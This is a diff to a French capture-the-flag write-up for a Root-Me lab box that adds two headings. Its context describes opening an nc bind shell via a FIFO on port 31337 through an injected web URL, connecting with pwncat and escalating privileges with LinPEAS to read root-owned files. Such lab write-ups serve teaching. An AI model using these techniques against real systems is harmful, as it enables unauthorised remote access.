@@ -119,6 +119,8 @@ drwxr-xr-x  14 root root       4096 Jan  9  2021 var
 
 Le fichier `/flag.txt` appartient à `root` et n'est accessible en lecture que pour son propriétaire. Il en va de même pour `/passwd`, nécessaire pour valider la box. Le seul moyen de lire ces fichiers est donc d'effectuer une élévation de privilèges.
 
+#### Shell interactif
+
 Essayons déjà d'obtenir un shell interactif pour nous faciliter la tâche. Pour cela, on va utiliser `nc` pour ouvrir un *bind shell* sur le port 31337, par le biais d'une FIFO (named pipe) :
 
 ```sh
@@ -131,6 +133,8 @@ http://ctf06.root-me.org/ecrire/?exec=article&id_article=1&ajouter=non&tri_liste
 
 On peut maintenant se connecter au shell interactif avec [pwncat]({{< ref "/outils/pwncat-cs/" >}}) :
 ![Shell interactif avec pwncat](/images/rootme2020/pwncat-1.png)
+
+#### Élévation de privilèges
 
 Essayons de trouver une faille d'élévation de privilèges grâce à LinPEAS :
 
